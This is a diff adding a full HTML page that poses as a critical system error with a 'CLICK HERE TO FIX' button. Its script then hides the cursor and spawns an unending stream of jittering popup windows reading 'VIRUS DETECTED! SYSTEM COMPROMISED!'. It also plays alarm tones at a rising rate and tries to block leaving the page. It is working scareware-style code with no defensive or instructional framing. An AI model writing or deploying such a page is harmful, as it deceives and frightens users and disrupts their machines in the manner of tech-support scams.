@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Warning!</title>
+    <style>
+        body {
+            user-select: none;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #000;
+            cursor: none;
+            overflow: hidden;
+        }
+
+        .alert-text {
+            color: #ff0000;
+            font-size: 4rem;
+            text-align: center;
+            text-shadow: 0 0 20px #ff0000;
+            animation: glitch 1s infinite;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-5px, 5px); }
+            40% { transform: translate(-5px, -5px); }
+            60% { transform: translate(5px, 5px); }
+            80% { transform: translate(5px, -5px); }
+            100% { transform: translate(0); }
+        }
+
+        #warningBtn {
+            padding: 20px 40px;
+            font-size: 2rem;
+            background: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 30px;
+            transition: transform 0.3s;
+        }
+
+        #warningBtn:hover {
+            transform: scale(1.1);
+        }
+    </style>
+</head>
+<body>
+    <h1 class="alert-text">⚠ CRITICAL SYSTEM ERROR ⚠</h1>
+    <button id="warningBtn">CLICK HERE TO FIX</button>
+
+    <script>
+        'use strict';
+
+        let audioContext;
+        let isChaosStarted = false;
+
+        function createAudioContext() {
+            try {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                if (audioContext.state === 'suspended') {
+                    audioContext.resume();
+                }
+            } catch (error) {
+                console.error('Audio context error:', error);
+            }
+        }
+
+        function createAlertWindow() {
+            const screenWidth = window.screen.availWidth;
+            const screenHeight = window.screen.availHeight;
+            
+            const width = Math.floor(Math.random() * 400) + 200;
+            const height = Math.floor(Math.random() * 400) + 200;
+            const left = Math.floor(Math.random() * (screenWidth - width));
+            const top = Math.floor(Math.random() * (screenHeight - height));
+
+            const features = `
+                width=${width},
+                height=${height},
+                left=${left},
+                top=${top},
+                resizable=no,
+                toolbar=no,
+                menubar=no,
+                scrollbars=no,
+                status=no,
+                location=no
+            `;
+
+            const win = window.open('', '_blank', features);
+            
+            if (win) {
+                win.document.write(`
+                    <html style="background:black;">
+                        <h1 style="color:red;text-align:center;font-size:2rem;">
+                            VIRUS DETECTED!<br>SYSTEM COMPROMISED!
+                        </h1>
+                        <script>
+                            setInterval(() => {
+                                window.moveTo(
+                                    Math.random() * (screen.availWidth - ${width}),
+                                    Math.random() * (screen.availHeight - ${height})
+                                );
+                            }, 100);
+                        <\/script>
+                    </html>
+                `);
+            }
+        }
+
+        function playAlarmSound() {
+            if (!audioContext) return;
+
+            try {
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+
+                oscillator.type = 'square';
+                oscillator.frequency.setValueAtTime(440, audioContext.currentTime);
+                gainNode.gain.setValueAtTime(0.2, audioContext.currentTime);
+
+                oscillator.start(audioContext.currentTime);
+                oscillator.stop(audioContext.currentTime + 0.8);
+            } catch (error) {
+                console.error('Sound error:', error);
+            }
+        }
+
+        function initiateChaos() {
+            if (isChaosStarted) return;
+            isChaosStarted = true;
+
+            if (!audioContext) {
+                createAudioContext();
+            }
+
+            document.body.style.cursor = 'none';
+            document.getElementById('warningBtn').remove();
+            
+            let interval = 500;
+            const chaosInterval = setInterval(() => {
+                createAlertWindow();
+                playAlarmSound();
+                interval = Math.max(50, interval - 20);
+                clearInterval(chaosInterval);
+                setInterval(() => {
+                    createAlertWindow();
+                    playAlarmSound();
+                }, interval);
+            }, 10);
+
+            window.onbeforeunload = function() {
+                e.preventDefault();
+                return "Warning: System corruption in progress!";
+            };
+        }
+
+        document.getElementById('warningBtn').addEventListener('click', initiateChaos);
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && isChaosStarted) {
+                createAlertWindow();
+                playAlarmSound();
+            }
+        });
+    </script>
+</body>
+</html>
